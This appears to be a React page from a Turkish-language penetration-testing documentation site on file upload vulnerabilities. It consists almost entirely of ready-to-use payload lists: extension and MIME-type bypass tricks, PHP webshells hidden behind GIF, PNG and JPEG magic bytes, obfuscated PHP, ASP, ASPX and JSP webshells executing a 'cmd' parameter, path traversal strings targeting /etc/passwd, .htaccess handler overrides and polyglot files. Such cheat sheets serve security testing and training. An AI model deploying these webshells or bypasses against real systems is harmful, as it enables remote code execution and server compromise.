"use client"

import { motion } from "framer-motion"
import { Globe, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function FileUploadPage() {
  return (
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
          <Globe className="w-4 h-4" />
          <span>Web Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">File Upload Zafiyetleri</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          Dosya yükleme kısıtlamalarını atlatarak webshell yükleme, path traversal ve RCE saldırıları.
        </p>
      </motion.div>

      <Callout type="warning" title="Önemli">
        File upload zafiyetleri doğrudan RCE&apos;ye yol açabilir. Yüklenen dosyanın
        nerede saklandığını ve nasıl erişildiğini bulmak kritiktir.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Extension Bypass</h2>
        <PayloadList
          title="PHP Extension Bypass"
          initialShow={10}
          payloads={[
            { code: `shell.php`, note: "Direkt PHP - filtrelenmiyorsa" },
            { code: `shell.php5`, note: "PHP5 extension" },
            { code: `shell.php7`, note: "PHP7 extension" },
            { code: `shell.phtml`, note: "PHTML - PHP olarak çalışır" },
            { code: `shell.phar`, note: "PHAR archive" },
            { code: `shell.phps`, note: "PHP source" },
            { code: `shell.php.jpg`, note: "Double extension" },
            { code: `shell.php.png`, note: "Double extension variant" },
            { code: `shell.jpg.php`, note: "Reverse double extension" },
            { code: `shell.php%00.jpg`, note: "Null byte injection (eski sistemler)" },
            { code: `shell.php%0a.jpg`, note: "Newline injection" },
            { code: `shell.php....`, note: "Trailing dots (Windows)" },
            { code: `shell.php::$DATA`, note: "NTFS alternate data stream" },
            { code: `shell.PHP`, note: "Case sensitivity bypass" },
            { code: `shell.pHp`, note: "Mixed case" },
            { code: `shell.php `, note: "Trailing space (Windows)" },
            { code: `shell.php;.jpg`, note: "Semicolon injection" },
            { code: `shell.php#.jpg`, note: "Hash injection" },
            { code: `shell.php/`, note: "Trailing slash" },
            { code: `.htaccess`, note: "Apache config override" },
          ]}
        />

        <PayloadList
          title="ASP/ASPX Extension"
          initialShow={5}
          payloads={[
            { code: `shell.asp`, note: "Classic ASP" },
            { code: `shell.aspx`, note: "ASP.NET" },
            { code: `shell.ashx`, note: "ASP.NET handler" },
            { code: `shell.asmx`, note: "Web service" },
            { code: `shell.cer`, note: "Certificate file - IIS çalıştırır" },
            { code: `shell.asa`, note: "ASA file" },
            { code: `shell.config`, note: "Web.config dosyası" },
          ]}
        />

        <PayloadList
          title="JSP Extension"
          initialShow={5}
          payloads={[
            { code: `shell.jsp`, note: "JavaServer Pages" },
            { code: `shell.jspx`, note: "JSPX variant" },
            { code: `shell.jsw`, note: "JSW file" },
            { code: `shell.jsv`, note: "JSV file" },
            { code: `shell.war`, note: "WAR archive - deploy edilir" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Content-Type Bypass</h2>
        <PayloadList
          title="MIME Type Manipulation"
          initialShow={8}
          payloads={[
            { code: `Content-Type: image/jpeg`, note: "JPEG olarak gönder" },
            { code: `Content-Type: image/png`, note: "PNG olarak gönder" },
            { code: `Content-Type: image/gif`, note: "GIF olarak gönder" },
            { code: `Content-Type: application/octet-stream`, note: "Binary stream" },
            { code: `Content-Type: text/plain`, note: "Plain text" },
            { code: `Content-Type: image/svg+xml`, note: "SVG (XSS için)" },
            { code: `Content-Type: application/pdf`, note: "PDF olarak" },
            { code: `Content-Type: IMAGE/JPEG`, note: "Uppercase MIME" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Magic Bytes</h2>
        <PayloadList
          title="File Signature Bypass"
          initialShow={8}
          payloads={[
            { code: `GIF89a<?php system($_GET['cmd']); ?>`, note: "GIF magic bytes + PHP" },
            { code: `GIF87a<?php system($_GET['cmd']); ?>`, note: "GIF87a variant" },
            { code: `\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>`, note: "PNG magic bytes + PHP" },
            { code: `\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>`, note: "JPEG magic bytes + PHP" },
            { code: `%PDF-1.4<?php system($_GET['cmd']); ?>`, note: "PDF magic bytes + PHP" },
            { code: `BM<?php system($_GET['cmd']); ?>`, note: "BMP magic bytes + PHP" },
            { code: `PK\x03\x04 (ZIP header with PHP inside)`, note: "ZIP/DOCX/XLSX içinde PHP" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Webshell Payloadları</h2>
        <PayloadList
          title="PHP Webshells"
          initialShow={8}
          payloads={[
            { code: `<?php system($_GET['cmd']); ?>`, note: "Basit webshell" },
            { code: `<?php passthru($_GET['cmd']); ?>`, note: "passthru kullanarak" },
            { code: `<?php echo shell_exec($_GET['cmd']); ?>`, note: "shell_exec" },
            { code: `<?php echo exec($_GET['cmd']); ?>`, note: "exec" },
            { code: `<?=\`$_GET[0]\`?>`, note: "Kısa tag + backtick" },
            { code: `<?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>`, note: "Concatenation bypass" },
            { code: `<?php $_GET[0]($_GET[1]); ?>`, note: "Dynamic function call" },
            { code: `<?php eval(base64_decode($_GET['cmd'])); ?>`, note: "Base64 encoded command" },
            { code: `<?php assert($_GET['cmd']); ?>`, note: "Assert RCE" },
            { code: `<?php preg_replace('/.*/e', $_GET['cmd'], ''); ?>`, note: "preg_replace /e modifier" },
            { code: `<?php create_function('', $_GET['cmd'])(); ?>`, note: "create_function RCE" },
            { code: `<?php array_map('system', array($_GET['cmd'])); ?>`, note: "array_map callback" },
            { code: `<?php usort(array($_GET['cmd'], ''), 'assert'); ?>`, note: "usort callback" },
            { code: `<?php $f=new ReflectionFunction('system');$f->invoke($_GET['cmd']); ?>`, note: "Reflection API" },
          ]}
        />

        <PayloadList
          title="ASP Webshells"
          initialShow={5}
          payloads={[
            { code: `<%eval request("cmd")%>`, note: "Classic ASP webshell" },
            { code: `<%execute request("cmd")%>`, note: "Execute variant" },
            { code: `<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>`, note: "ASPX webshell" },
            { code: `<% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll) %>`, note: "WScript.Shell" },
          ]}
        />

        <PayloadList
          title="JSP Webshells"
          initialShow={4}
          payloads={[
            { code: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`, note: "Basit JSP webshell" },
            { code: `<%@ page import="java.util.*,java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String s;while((s=br.readLine())!=null){out.println(s);}%>`, note: "Output gösteren JSP" },
            { code: `${Runtime.getRuntime().exec("id")}`, note: "EL expression injection" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Path Traversal</h2>
        <PayloadList
          title="Path Traversal Payloads"
          initialShow={8}
          payloads={[
            { code: `../../../etc/passwd`, note: "Klasik path traversal" },
            { code: `....//....//....//etc/passwd`, note: "Filter bypass" },
            { code: `..%2f..%2f..%2fetc/passwd`, note: "URL encoded" },
            { code: `..%252f..%252f..%252fetc/passwd`, note: "Double URL encoded" },
            { code: `..%c0%afetc/passwd`, note: "UTF-8 encoding" },
            { code: `..\\..\\..\\etc\\passwd`, note: "Backslash (Windows)" },
            { code: `/var/www/../../etc/passwd`, note: "Absolute + traversal" },
            { code: `filename="../../shell.php"`, note: "Filename parametresinde traversal" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">.htaccess Override</h2>
        <PayloadList
          title=".htaccess Payloads"
          initialShow={5}
          payloads={[
            { code: `AddType application/x-httpd-php .jpg`, note: ".jpg dosyalarını PHP olarak çalıştır" },
            { code: `AddHandler php5-script .jpg`, note: "PHP5 handler" },
            { code: `<FilesMatch "\\.jpg$">
SetHandler application/x-httpd-php
</FilesMatch>`, note: "FilesMatch ile handler" },
            { code: `php_value auto_prepend_file shell.jpg`, note: "Auto prepend PHP file" },
            { code: `Options +ExecCGI
AddHandler cgi-script .jpg`, note: "CGI olarak çalıştır" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Polyglot Files</h2>
        <PayloadList
          title="Polyglot Payloads"
          initialShow={4}
          payloads={[
            { code: `GIF89a; <?php system($_GET['cmd']); ?>`, note: "GIF + PHP polyglot" },
            { code: `/* GIF89a */ <?php system($_GET['cmd']); __halt_compiler();`, note: "GIF comment + PHP" },
            { code: `#define width 1
#define height 1
<?php system($_GET['cmd']); ?>`, note: "XBM + PHP polyglot" },
            { code: `RIFF\x00\x00\x00\x00WEBP<?php system($_GET['cmd']); ?>`, note: "WebP + PHP" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test İpuçları">
        1. Dosya yükle ve response&apos;da path&apos;i bul
        2. Farklı extension kombinasyonlarını dene
        3. Content-Type header&apos;ı manipüle et
        4. Magic bytes ekle
        5. .htaccess yüklemeyi dene
        6. Path traversal ile dosya konumunu değiştir
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/web/deserialization" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>Deserialization</span>
        </Link>
        <Link href="/docs/api/bola-idor" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>BOLA / IDOR</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
  )
}
